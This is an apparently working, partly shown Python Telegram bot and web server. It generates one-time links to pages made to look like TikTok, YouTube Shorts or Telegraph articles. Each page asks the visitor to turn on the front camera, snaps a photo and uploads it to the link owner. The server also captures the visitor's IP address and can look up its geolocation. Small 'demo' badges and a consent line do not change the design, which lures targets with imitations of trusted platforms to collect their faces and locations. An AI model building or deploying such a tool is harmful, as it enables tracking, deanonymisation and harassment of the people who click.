import asyncio
import html
import json
import os
import secrets
import sqlite3
from contextlib import closing
from pathlib import Path

import httpx
import uvicorn
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.types import BufferedInputFile, KeyboardButton, Message, ReplyKeyboardMarkup
from fastapi import FastAPI, File, HTTPException, Request, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_BASE_URL = os.environ["PUBLIC_BASE_URL"].rstrip("/")
PORT = int(os.getenv("PORT", "8000"))
DB_PATH = Path(os.getenv("DB_PATH", "links.sqlite3"))
MAX_PHOTO_BYTES = 10 * 1024 * 1024
APP_DIR = Path(__file__).resolve().parent

bot = Bot(BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)
app = FastAPI(docs_url=None, redoc_url=None)
app.mount("/static", StaticFiles(directory=str(APP_DIR)), name="static")

SERVICES = {
    "tiktok": {"name": "TikTok", "emoji": "🎵"},
    "youtube": {"name": "YouTube Shorts", "emoji": "📺"},
    "telegraph": {"name": "Telegraph", "emoji": "📝"},
}

SKIP_TEXT = "⏭ Пропустить"
PHOTO_YES = "✅ Да, вставить фото"
PHOTO_NO = "❌ Нет, без фото"
NEW_LINK_TEXT = "🔗 Создать новую ссылку"

DEFAULT_TELEGRAPH_TITLE = "Статья Telegraph"
DEFAULT_TELEGRAPH_CONTENT = "Это пример статьи, созданной через бота."


def db_init() -> None:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute(
            """
            CREATE TABLE IF NOT EXISTS links (
                token TEXT PRIMARY KEY,
                owner_chat_id INTEGER NOT NULL,
                used INTEGER NOT NULL DEFAULT 0,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                service TEXT NOT NULL DEFAULT 'tiktok',
                title TEXT DEFAULT '',
                content TEXT DEFAULT '',
                show_photo INTEGER NOT NULL DEFAULT 1
            )
            """
        )
        columns = {row[1] for row in con.execute("PRAGMA table_info(links)").fetchall()}
        if "service" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN service TEXT NOT NULL DEFAULT 'tiktok'")
        if "title" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN title TEXT DEFAULT ''")
        if "content" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN content TEXT DEFAULT ''")
        if "show_photo" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN show_photo INTEGER NOT NULL DEFAULT 1")

        con.execute(
            """
            CREATE TABLE IF NOT EXISTS telegraph_drafts (
                chat_id INTEGER PRIMARY KEY,
                step TEXT NOT NULL,
                title TEXT DEFAULT '',
                content TEXT DEFAULT '',
                updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """
        )
        draft_columns = {
            row[1] for row in con.execute("PRAGMA table_info(telegraph_drafts)").fetchall()
        }
        if "content" not in draft_columns:
            con.execute("ALTER TABLE telegraph_drafts ADD COLUMN content TEXT DEFAULT ''")
        con.commit()


def set_telegraph_draft(
    chat_id: int,
    step: str,
    title: str = "",
    content: str = "",
) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute(
            """
            INSERT INTO telegraph_drafts(chat_id, step, title, content, updated_at)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(chat_id) DO UPDATE SET
                step = excluded.step,
                title = excluded.title,
                content = excluded.content,
                updated_at = CURRENT_TIMESTAMP
            """,
            (chat_id, step, title, content),
        )
        con.commit()


def get_telegraph_draft(chat_id: int):
    with closing(sqlite3.connect(DB_PATH)) as con:
        return con.execute(
            "SELECT step, title, content FROM telegraph_drafts WHERE chat_id = ?",
            (chat_id,),
        ).fetchone()


def clear_telegraph_draft(chat_id: int) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute("DELETE FROM telegraph_drafts WHERE chat_id = ?", (chat_id,))
        con.commit()


def create_link(
    owner_chat_id: int,
    service: str,
    title: str = "",
    content: str = "",
    show_photo: bool = True,
) -> str:
    if service not in SERVICES:
        raise ValueError(f"Unknown service: {service}")

    while True:
        token = secrets.token_urlsafe(18)
        try:
            with closing(sqlite3.connect(DB_PATH)) as con:
                con.execute(
                    """
                    INSERT INTO links(
                        token, owner_chat_id, used, service, title, content, show_photo
                    ) VALUES (?, ?, 0, ?, ?, ?, ?)
                    """,
                    (
                        token,
                        owner_chat_id,
                        service,
                        title,
                        content,
                        1 if show_photo else 0,
                    ),
                )
                con.commit()
            return token
        except sqlite3.IntegrityError:
            continue


def get_link(token: str):
    with closing(sqlite3.connect(DB_PATH)) as con:
        return con.execute(
            """
            SELECT owner_chat_id, used, service, title, content, show_photo
            FROM links
            WHERE token = ?
            """,
            (token,),
        ).fetchone()


def resolve_link(identifier: str, expected_service: str):
    """
    New links use the full token. For old 8-char links we keep a strictly
    service-scoped fallback. A TikTok URL can therefore never resolve to a
    YouTube/Telegraph row and vice versa.
    """
    with closing(sqlite3.connect(DB_PATH)) as con:
        exact = con.execute(
            """
            SELECT token, owner_chat_id, used, service, title, content, show_photo
            FROM links
            WHERE token = ? AND service = ?
            """,
            (identifier, expected_service),
        ).fetchone()
        if exact:
            return exact

        rows = con.execute(
            """
            SELECT token, owner_chat_id, used, service, title, content, show_photo
            FROM links
            WHERE token LIKE ? AND service = ?
            LIMIT 2
            """,
            (f"{identifier}%", expected_service),
        ).fetchall()
        return rows[0] if len(rows) == 1 else None


def claim_link(token: str) -> bool:
    with closing(sqlite3.connect(DB_PATH)) as con:
        cur = con.execute(
            "UPDATE links SET used = 2 WHERE token = ? AND used = 0",
            (token,),
        )
        con.commit()
        return cur.rowcount == 1


def finish_link(token: str) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute("UPDATE links SET used = 1 WHERE token = ?", (token,))
        con.commit()


def release_link(token: str) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute("UPDATE links SET used = 0 WHERE token = ? AND used = 2", (token,))
        con.commit()


def client_ip(request: Request) -> str:
    cf = request.headers.get("cf-connecting-ip")
    if cf:
        return cf.strip()
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


async def lookup_ip(ip: str) -> dict:
    if ip in {"unknown", "127.0.0.1", "::1"}:
        return {}
    try:
        async with httpx.AsyncClient(timeout=6.0) as client:
            response = await client.get(f"https://ipwho.is/{ip}")
            response.raise_for_status()
            data = response.json()
            if not data.get("success", True):
                return {}
            return data
    except Exception:
        return {}


def public_link(service: str, token: str) -> str:
    # Full tokens remove short-ID collisions. Each service also has its own
    # route, so the selected design cannot be mixed up by a generic handler.
    if service == "tiktok":
        return f"{PUBLIC_BASE_URL}/@{token}"
    if service == "youtube":
        return f"{PUBLIC_BASE_URL}/shorts/{token}"
    if service == "telegraph":
        return f"{PUBLIC_BASE_URL}/article/{token}"
    raise ValueError(f"Unknown service: {service}")


def service_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎵 TikTok")],
            [KeyboardButton(text="📺 YouTube")],
            [KeyboardButton(text="📝 Telegraph")],
        ],
        resize_keyboard=True,
    )


def skip_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=SKIP_TEXT)]],
        resize_keyboard=True,
    )


def photo_choice_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=PHOTO_YES)],
            [KeyboardButton(text=PHOTO_NO)],
        ],
        resize_keyboard=True,
    )


def finished_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=NEW_LINK_TEXT)]],
        resize_keyboard=True,
    )


async def send_created_link(message: Message, service: str, token: str) -> None:
    info = SERVICES[service]
    url = public_link(service, token)
    await message.answer(
        f"{info['emoji']} Одноразовая ссылка создана:\n"
        f"<a href='{html.escape(url, quote=True)}'>{html.escape(url)}</a>\n\n"
        f"Оформление страницы: {info['name']}.",
        parse_mode="HTML",
        reply_markup=finished_keyboard(),
        disable_web_page_preview=False,
    )


@router.message(CommandStart())
async def start(message: Message):
    clear_telegraph_draft(message.chat.id)
    await message.answer(
        "👋 Выберите оформление страницы:",
        reply_markup=service_keyboard(),
    )


@router.message(Command("new"))
async def new_link_command(message: Message):
    clear_telegraph_draft(message.chat.id)
    await message.answer(
        "Выберите оформление новой ссылки:",
        reply_markup=service_keyboard(),
    )


@router.message(F.text == NEW_LINK_TEXT)
async def new_link(message: Message):
    clear_telegraph_draft(message.chat.id)
    await message.answer(
        "Выберите оформление новой ссылки:",
        reply_markup=service_keyboard(),
    )


@router.message(F.text.in_({"🎵 TikTok", "📺 YouTube", "📝 Telegraph"}))
async def create_service_link(message: Message):
    service_map = {
        "🎵 TikTok": "tiktok",
        "📺 YouTube": "youtube",
        "📝 Telegraph": "telegraph",
    }
    service = service_map[message.text]
    clear_telegraph_draft(message.chat.id)

    if service == "telegraph":
        set_telegraph_draft(message.chat.id, "title")
        await message.answer(
            "📝 Введите заголовок статьи.\n"
            f"Чтобы оставить стандартный — нажмите «{SKIP_TEXT}».",
            reply_markup=skip_keyboard(),
        )
        return

    token = create_link(message.chat.id, service)
    await send_created_link(message, service, token)


@router.message(F.text)
async def handle_telegraph_input(message: Message):
    chat_id = message.chat.id
    draft = get_telegraph_draft(chat_id)
    if not draft:
        return

    step, saved_title, saved_content = draft
    text = (message.text or "").strip()

    if step == "title":
        title = DEFAULT_TELEGRAPH_TITLE if text in {SKIP_TEXT, "-"} else text
        if not title:
            title = DEFAULT_TELEGRAPH_TITLE
        set_telegraph_draft(chat_id, "content", title=title)
        await message.answer(
            "✍️ Введите текст статьи.\n"
            f"Чтобы оставить стандартный текст — нажмите «{SKIP_TEXT}».",
            reply_markup=skip_keyboard(),
        )
        return

    if step == "content":
        content = DEFAULT_TELEGRAPH_CONTENT if text in {SKIP_TEXT, "-"} else text
        if not content:
            content = DEFAULT_TELEGRAPH_CONTENT
        set_telegraph_draft(
            chat_id,
            "photo",
            title=saved_title or DEFAULT_TELEGRAPH_TITLE,
            content=content,
        )
        await message.answer(
            "🖼 Вставить стандартную фотографию из photo.png в статью?",
            reply_markup=photo_choice_keyboard(),
        )
        return

    if step == "photo":
        if text not in {PHOTO_YES, PHOTO_NO}:
            await message.answer(
                "Выберите один из вариантов кнопками ниже:",
                reply_markup=photo_choice_keyboard(),
            )
            return

        show_photo = text == PHOTO_YES
        token = create_link(
            chat_id,
            "telegraph",
            title=saved_title or DEFAULT_TELEGRAPH_TITLE,
            content=saved_content or DEFAULT_TELEGRAPH_CONTENT,
            show_photo=show_photo,
        )
        clear_telegraph_draft(chat_id)
        await send_created_link(message, "telegraph", token)


def camera_script(token: str) -> str:
    return f"""
<script>
const token = {json.dumps(token)};
const video = document.getElementById('video');
const preview = document.getElementById('preview');
const status = document.getElementById('status');
const cameraBtn = document.getElementById('cameraBtn');
const sendBtn = document.getElementById('sendBtn');
let stream = null;
let sending = false;

cameraBtn.addEventListener('click', async () => {{
  try {{
    if (!navigator.mediaDevices?.getUserMedia) {{
      throw new Error('Камера недоступна в этом браузере');
    }}
    stream = await navigator.mediaDevices.getUserMedia({{
      video: {{ facingMode: 'user' }},
      audio: false
    }});
    video.srcObject = stream;
    video.style.display = 'block';
    if (preview) preview.style.display = 'none';
    cameraBtn.style.display = 'none';
    sendBtn.style.display = 'block';
    status.textContent = 'Камера включена. Нажмите «Сделать и отправить».';
  }} catch (e) {{
    status.textContent = 'Ошибка: ' + e.message;
  }}
}});

sendBtn.addEventListener('click', async () => {{
  if (!stream || sending) return;
  sending = true;
  sendBtn.disabled = true;
  status.textContent = 'Отправка…';

  try {{
    await new Promise(resolve =>
      video.readyState >= 2 ? resolve() : (video.onloadeddata = resolve)
    );

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 720;
    canvas.height = video.videoHeight || 1280;
    canvas.getContext('2d').drawImage(video, 0, 0);

    const blob = await new Promise(resolve =>
      canvas.toBlob(resolve, 'image/jpeg', 0.92)
    );
    if (!blob) throw new Error('Не удалось создать снимок');

    const form = new FormData();
    form.append('photo', blob, 'photo.jpg');

    const response = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{
      method: 'POST',
      body: form
    }});
    const data = await response.json().catch(() => ({{}}));
    if (!response.ok) throw new Error(data.detail || 'Ошибка отправки');

    stream.getTracks().forEach(track => track.stop());
    video.style.display = 'none';
    if (preview) preview.style.display = 'block';
    sendBtn.style.display = 'none';
    status.textContent = 'Фото отправлено.';
  }} catch (e) {{
    status.textContent = 'Ошибка: ' + e.message;
    sendBtn.disabled = false;
    sending = false;
  }}
}});

(function updateClock() {{
  const clock = document.getElementById('clock');
  if (!clock) return;
  const now = new Date();
  clock.textContent = now.toLocaleTimeString('ru-RU', {{
    hour: '2-digit',
    minute: '2-digit'
  }});
}})();
</script>
"""


def generate_tiktok_page(token: str) -> str:
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
    script = camera_script(token)

    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>TikTok-style demo</title>
<style>
* {{ box-sizing:border-box; margin:0; padding:0; }}
:root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif; }}
body {{ min-height:100svh; background:#000; color:#fff; display:flex; justify-content:center; overflow:hidden; }}
.phone {{ position:relative; width:100%; max-width:590px; height:100svh; overflow:hidden; background:#000; }}
.media {{ position:absolute; inset:0 0 66px; width:100%; height:calc(100% - 66px); object-fit:cover; background:#141414; }}
#video {{ display:none; }}
.gradient {{ position:absolute; inset:0 0 66px; background:linear-gradient(180deg,rgba(0,0,0,.22) 0%,rgba(0,0,0,0) 24%,rgba(0,0,0,.02) 58%,rgba(0,0,0,.78) 100%); pointer-events:none; }}
.statusbar {{ position:absolute; z-index:8; top:max(10px,env(safe-area-inset-top)); left:20px; right:18px; height:28px; display:flex; align-items:center; justify-content:space-between; font-size:17px; font-weight:700; text-shadow:0 1px 4px #000; }}
.status-icons {{ display:flex; gap:7px; align-items:center; font-size:15px; }}
.battery {{ border:1.6px solid #fff; border-radius:5px; padding:1px 5px; font-size:12px; line-height:16px; }}
.tabs {{ position:absolute; z-index:7; top:max(57px,calc(env(safe-area-inset-top) + 47px)); left:18px; right:16px; display:flex; align-items:center; justify-content:center; gap:15px; font-size:16px; font-weight:700; text-shadow:0 1px 5px #000; white-space:nowrap; }}
.tabs .dim {{ opacity:.82; }}
.tabs .active {{ position:relative; }}
.tabs .active::after {{ content:""; position:absolute; height:3px; width:38px; border-radius:2px; background:#fff; left:50%; transform:translateX(-50%); bottom:-9px; }}
.search {{ margin-left:auto; font-size:31px; font-weight:300; line-height:1; }}
.demo {{ position:absolute; z-index:10; top:max(104px,calc(env(safe-area-inset-top) + 94px)); left:50%; transform:translateX(-50%); background:rgba(0,0,0,.72); border:1px solid rgba(255,255,255,.45); border-radius:999px; padding:6px 11px; font-size:11px; font-weight:800; letter-spacing:.2px; backdrop-filter:blur(9px); white-space:nowrap; }}
.actions {{ position:absolute; z-index:7; right:11px; bottom:126px; display:flex; flex-direction:column; align-items:center; gap:17px; text-shadow:0 1px 5px #000; }}
.avatar-wrap {{ position:relative; margin-bottom:3px; }}
.avatar {{ width:49px; height:49px; border-radius:50%; border:2px solid #fff; object-fit:cover; background:#333; display:grid; place-items:center; font-size:20px; font-weight:800; }}
.follow {{ position:absolute; width:23px; height:23px; border-radius:50%; background:#fe2c55; display:grid; place-items:center; left:13px; bottom:-10px; font-size:20px; font-weight:400; }}
.action {{ display:flex; flex-direction:column; align-items:center; gap:3px; font-size:12px; font-weight:700; min-width:58px; }}
.action .icon {{ font-size:38px; line-height:37px; filter:drop-shadow(0 1px 2px #000); }}
.action .small-icon {{ font-size:34px; }}
.disc {{ width:43px; height:43px; border-radius:50%; background:radial-gradient(circle,#777 0 15%,#111 17% 45%,#444 47% 57%,#151515 59%); border:7px solid rgba(20,20,20,.85); margin-top:4px; }}
.copy {{ position:absolute; z-index:6; left:17px; right:82px; bottom:82px; text-shadow:0 1px 5px #000; }}
.username {{ font-size:18px; font-weight:800; margin-bottom:8px; }}
.caption {{ font-size:15px; line-height:1.28; margin-bottom:7px; }}
.original {{ font-size:14px; color:#eee; margin-bottom:9px; }}
.music {{ font-size:14px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }}
.nav {{ position:absolute; z-index:9; left:0; right:0; bottom:0; height:66px; padding-bottom:env(safe-area-inset-bottom); background:#050505; border-top:1px solid rgba(255,255,255,.08); display:flex; align-items:center; justify-content:space-around; }}
.nav-item {{ min-width:68px; display:flex; flex-direction:column; align-items:center; gap:2px; font-size:10px; }}
.nav-icon {{ font-size:27px; line-height:28px; }}
.plus {{ width:49px; height:31px; border-radius:8px; background:#fff; color:#000; display:grid; place-items:center; font-size:28px; line-height:1; box-shadow:-4px 0 #25f4ee,4px 0 #fe2c55; }}
.consent {{ position:absolute; z-index:20; left:10px; right:10px; bottom:74px; padding:12px 13px; border-radius:15px; background:rgba(12,12,12,.92); border:1px solid rgba(255,255,255,.25); backdrop-filter:blur(14px); box-shadow:0 10px 35px rgba(0,0,0,.35); }}
.consent p {{ font-size:12px; line-height:1.35; color:#f3f3f3; margin-bottom:9px; }}
.btnrow {{ display:flex; gap:8px; }}
button {{ flex:1; border:0; border-radius:9px; padding:10px 10px; font-weight:800; font-size:13px; cursor:pointer; }}
#cameraBtn {{ background:#fff; color:#111; }}
#sendBtn {{ display:none; background:#fe2c55; color:#fff; }}
#status {{ min-height:15px; margin-top:6px; font-size:11px; color:#ddd; }}
@media (max-width:430px) {{ .tabs {{ gap:10px; font-size:14px; left:10px; }} .search {{ font-size:28px; }} .copy {{ right:76px; }} }}
</style>
</head>
<body>
<div class="phone">
  <img class="media" id="preview" src="{photo_url}" alt="Видео-превью">
  <video class="media" id="video" playsinline autoplay muted></video>
  <div class="gradient"></div>

  <div class="statusbar">
    <span id="clock">16:28</span>
    <span class="status-icons"><span>▮▮▮</span><span>◓</span><span class="battery">83</span></span>
  </div>

  <div class="tabs">
    <span class="dim">LIVE</span>
    <span class="dim">Сообщество</span>
    <span class="dim">Подписки</span>
    <span class="active">Рекомендации</span>
    <span class="search">⌕</span>
  </div>
  <div class="demo">ДЕМО • НЕ ОФИЦИАЛЬНЫЙ TIKTOK</div>

  <div class="actions">
    <div class="avatar-wrap"><div class="avatar">V</div><div class="follow">+</div></div>
    <div class="action"><span class="icon">♥</span><span>100,3 тыс.</span></div>
    <div class="action"><span class="icon small-icon">●</span><span>575</span></div>
    <div class="action"><span class="icon small-icon">▮</span><span>12,8 тыс.</span></div>
    <div class="action"><span class="icon small-icon">↗</span><span>5720</span></div>
    <div class="disc"></div>
  </div>

  <div class="copy">
    <div class="username">@verhcau</div>
    <div class="caption">Твоё ежедневное короткое видео. Ещё больше — в рекомендациях.</div>
    <div class="original">Посмотреть оригинал</div>
    <div class="music">♫ Оригинальный звук — verhcau</div>
  </div>

  <div class="consent">
    <p>Камера включится только после вашего нажатия. При отправке снимок и IP-данные будут переданы владельцу этой ссылки.</p>
    <div class="btnrow">
      <button id="cameraBtn">Разрешить камеру</button>
      <button id="sendBtn">Сделать и отправить</button>
    </div>
    <div id="status"></div>
  </div>

  <div class="nav">
    <div class="nav-item"><span class="nav-icon">⌂</span><span>Главная</span></div>
    <div class="nav-item"><span class="nav-icon">◉</span><span>Друзья</span></div>
    <div class="nav-item"><span class="plus">+</span></div>
    <div class="nav-item"><span class="nav-icon">▢</span><span>Входящие</span></div>
    <div class="nav-item"><span class="nav-icon">♙</span><span>Профиль</span></div>
  </div>
</div>
{script}
</body>
</html>'''


def generate_youtube_page(token: str) -> str:
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
    script = camera_script(token)

    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>YouTube Shorts-style demo</title>
<style>
* {{ box-sizing:border-box; margin:0; padding:0; }}
:root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif; }}
body {{ min-height:100svh; background:#000; color:#fff; display:flex; justify-content:center; overflow:hidden; }}
.phone {{ position:relative; width:100%; max-width:590px; height:100svh; overflow:hidden; background:#000; }}
.statusbar {{ height:43px; padding:11px 22px 0; display:flex; align-items:center; justify-content:space-between; font-size:17px; font-weight:700; }}
.status-icons {{ display:flex; align-items:center; gap:7px; font-size:14px; }}
.battery {{ border:1.6px solid #fff; border-radius:5px; padding:1px 5px; font-size:12px; line-height:16px; }}
.header {{ height:70px; padding:10px 22px 0; display:flex; align-items:flex-start; justify-content:space-between; font-size:25px; }}
.header-left {{ display:flex; align-items:center; gap:19px; font-size:25px; font-weight:800; }}
.header-title {{ font-size:25px; }}
.header-right {{ display:flex; gap:21px; font-size:30px; align-items:center; }}
.chips {{ height:106px; padding:14px 20px 25px; display:flex; gap:12px; overflow:hidden; align-items:flex-start; position:relative; }}
.chip {{ flex:0 0 auto; height:54px; min-width:174px; border-radius:18px; background:#1e1e1e; display:flex; align-items:center; justify-content:center; gap:8px; font-size:17px; font-weight:700; }}
.demo {{ position:absolute; right:12px; bottom:9px; padding:5px 9px; border-radius:999px; background:#2b2b2b; border:1px solid #666; font-size:10px; font-weight:800; letter-spacing:.2px; }}
.stage {{ position:relative; height:47svh; min-height:315px; max-height:515px; background:#111; overflow:hidden; }}
.media {{ position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }}
#video {{ display:none; }}
.stage-shade {{ position:absolute; inset:0; background:linear-gradient(180deg,rgba(0,0,0,.03),rgba(0,0,0,.02) 66%,rgba(0,0,0,.28)); pointer-events:none; }}
.rail {{ position:absolute; z-index:8; right:11px; top:calc(43px + 70px + 106px + 47svh - 105px); transform:translateY(-100%); display:flex; flex-direction:column; gap:22px; align-items:center; }}
.rail-item {{ display:flex; flex-direction:column; align-items:center; gap:3px; font-size:13px; font-weight:600; min-width:67px; }}
.rail-icon {{ font-size:34px; line-height:35px; }}
.lower {{ position:relative; min-height:calc(100svh - 43px - 70px - 106px - 47svh); background:#000; padding:14px 86px 74px 21px; }}
.channel {{ display:flex; align-items:center; gap:10px; margin-top:3px; font-size:16px; font-weight:700; }}
.avatar {{ width:40px; height:40px; border-radius:50%; background:#2b2b2b; border:1px solid #777; display:grid; place-items:center; font-weight:900; }}
.subscribe {{ border:0; border-radius:22px; background:#fff; color:#000; padding:10px 16px; font-weight:800; font-size:14px; }}
.caption {{ margin-top:12px; font-size:15px; line-height:1.35; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }}
.progress {{ position:absolute; left:0; right:0; bottom:65px; height:4px; background:#555; }}
.progress span {{ display:block; width:3%; height:100%; background:#f00; position:relative; }}
.progress span::after {{ content:""; position:absolute; right:-5px; top:-3px; width:10px; height:10px; background:#f00; border-radius:50%; }}
.nav {{ position:absolute; z-index:12; left:0; right:0; bottom:0; height:66px; background:#111; border-top:1px solid #2e2e2e; display:flex; align-items:center; justify-content:space-around; padding-bottom:env(safe-area-inset-bottom); }}
.nav-item {{ min-width:68px; display:flex; flex-direction:column; align-items:center; gap:2px; font-size:10px; }}
.nav-icon {{ font-size:27px; line-height:28px; }}
.create {{ width:45px; height:45px; border-radius:50%; background:#2e2e2e; display:grid; place-items:center; font-size:31px; }}
.consent {{ position:absolute; z-index:20; left:10px; right:10px; bottom:72px; padding:12px 13px; border-radius:15px; background:rgba(18,18,18,.94); border:1px solid #555; backdrop-filter:blur(14px); }}
.consent p {{ font-size:12px; line-height:1.35; color:#f2f2f2; margin-bottom:9px; }}
.btnrow {{ display:flex; gap:8px; }}
button.action-btn {{ flex:1; border:0; border-radius:999px; padding:10px; font-size:13px; font-weight:800; cursor:pointer; }}
#cameraBtn {{ background:#fff; color:#111; }}
#sendBtn {{ display:none; background:#f00; color:#fff; }}
#status {{ min-height:15px; margin-top:6px; font-size:11px; color:#ddd; }}
@media (max-width:430px) {{ .chip {{ min-width:160px; font-size:15px; }} .header-title {{ font-size:23px; }} .rail {{ right:5px; }} }}
</style>
</head>
<body>
<div class="phone">
  <div class="statusbar">
    <span id="clock">16:28</span>
    <span class="status-icons"><span>▮▮▮</span><span>◓</span><span class="battery">83</span></span>
  </div>

  <div class="header">
    <div class="header-left"><span>‹</span><span class="header-title">Shorts</span></div>
    <div class="header-right"><span>◖</span><span>⌕</span><span>⋮</span></div>
  </div>

  <div class="chips">
    <div class="chip">▣ Подписки</div>
    <div class="chip">◉ В эфире</div>
    <div class="chip">▣ Объектив</div>
    <span class="demo">ДЕМО • НЕ ОФИЦИАЛЬНЫЙ YOUTUBE</span>
  </div>

  <div class="stage">
    <img class="media" id="preview" src="{photo_url}" alt="Shorts preview">
    <video class="media" id="video" playsinline autoplay muted></video>
    <div class="stage-shade"></div>
  </div>

  <div class="rail">
    <div class="rail-item"><span class="rail-icon">♡</span><span>9,4 тыс.</span></div>
    <div class="rail-item"><span class="rail-icon">▢</span><span>138</span></div>
    <div class="rail-item"><span class="rail-icon">↗</span><span>Поделиться</span></div>
    <div class="rail-item"><span class="rail-icon">⟳</span><span>Ремикс</span></div>
    <div class="rail-item"><span class="rail-icon">▣</span></div>
  </div>

  <div class="lower">
    <div class="channel"><span class="avatar">V</span><span>@verhcau</span><button class="subscribe">Подписаться</button></div>
    <div class="caption">Новое короткое видео 🔥 #shorts #video ...</div>
  </div>

  <div class="consent">
    <p>Камера включится только после вашего нажатия. При отправке снимок и IP-данные будут переданы владельцу этой ссылки.</p>
    <div class="btnrow">
      <button class="action-btn" id="cameraBtn">Разрешить камеру</button>
      <button class="action-btn" id="sendBtn">Сделать и отправить</button>
    </div>
    <div id="status"></div>
  </div>

  <div class="progress"><span></span></div>
  <div class="nav">
    <div class="nav-item"><span class="nav-icon">⌂</span><span>Главная</span></div>
    <div class="nav-item"><span class="nav-icon">◩</span><span>Shorts</span></div>
    <div class="nav-item"><span class="create">+</span></div>
    <div class="nav-item"><span class="nav-icon">▣</span><span>Подписки</span></div>
    <div class="nav-item"><span class="nav-icon">◉</span><span>Вы</span></div>
  </div>
</div>
{script}
</body>
</html>'''


def generate_telegraph_page(
    token: str,
    title: str,
    content: str,
    show_photo: bool,
) -> str:
    short_id = token[:8]
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
    safe_title = html.escape(title or DEFAULT_TELEGRAPH_TITLE)
    safe_content = "<br>".join(
        html.escape(content or DEFAULT_TELEGRAPH_CONTENT).splitlines()
    )
    hero = (
        f'<img class="hero" id="articleHero" src="{photo_url}" alt="Фото статьи">'
        if show_photo
        else ""
    )
    script = camera_script(token)

    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>{safe_title}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
:root {{ color-scheme:light; font-family:Georgia,"Times New Roman",serif; }}
body {{ background:#fff; min-height:100vh; color:#222; }}
.article {{ max-width:740px; margin:0 auto; padding:46px 24px 70px; }}
.brand {{ font-family:Arial,sans-serif; color:#8a8a8a; font-size:13px; margin-bottom:24px; }}
.demo {{ display:inline-block; margin-left:8px; border:1px solid #ccc; background:#f5f5f5; color:#555; border-radius:999px; padding:4px 8px; font-size:10px; font-weight:700; }}
h1 {{ font-size:42px; line-height:1.08; letter-spacing:-.5px; margin-bottom:10px; }}
.meta {{ font-family:Arial,sans-serif; color:#999; font-size:14px; margin-bottom:27px; }}
.hero {{ width:100%; max-height:480px; object-fit:cover; display:block; margin:0 0 26px; }}
.content {{ font-size:19px; line-height:1.62; overflow-wrap:anywhere; }}
.consent {{ margin-top:34px; border-top:1px solid #e3e3e3; padding-top:22px; font-family:Arial,sans-serif; }}
.note {{ font-size:13px; line-height:1.45; color:#666; margin-bottom:12px; }}
.buttons {{ display:flex; gap:9px; flex-wrap:wrap; }}
button {{ border:0; border-radius:8px; padding:11px 15px; font-size:14px; font-weight:700; cursor:pointer; }}
#cameraBtn {{ background:#222; color:#fff; }}
#sendBtn {{ display:none; background:#2a82d8; color:#fff; }}
#status {{ min-height:20px; margin-top:9px; color:#666; font-size:13px; }}
#video {{ display:none; width:100%; max-height:480px; object-fit:cover; margin-top:16px; border-radius:8px; }}
@media (max-width:600px) {{ .article {{ padding:32px 19px 55px; }} h1 {{ font-size:34px; }} .content {{ font-size:18px; }} }}
</style>
</head>
<body>
<main class="article">
  <div class="brand">Telegraph-style article <span class="demo">ДЕМО • НЕ ОФИЦИАЛЬНЫЙ TELEGRAPH</span></div>
  <h1>{safe_title}</h1>
  <div class="meta">Verhcau · #{short_id}</div>
  {hero}
  <div class="content">{safe_content}</div>

  <section class="consent">
    <div class="note">Камера включится только после вашего нажатия. При отправке снимок и IP-данные будут переданы владельцу этой ссылки.</div>
    <div class="buttons">
      <button id="cameraBtn">Разрешить камеру</button>
      <button id="sendBtn">Сделать и отправить</button>
    </div>
    <div id="status"></div>
    <img id="preview" src="{photo_url}" alt="Preview" style="display:none">
    <video id="video" playsinline autoplay muted></video>
  </section>
</main>
{script}
</body>
</html>'''


def render_service_link(identifier: str, expected_service: str) -> HTMLResponse:
    row = resolve_link(identifier, expected_service)
    if not row:
        raise HTTPException(404, "Ссылка не найдена")

    token, owner_chat_id, used, service, title, content, show_photo = row
    if service != expected_service:
        raise HTTPException(404, "Ссылка не найдена")
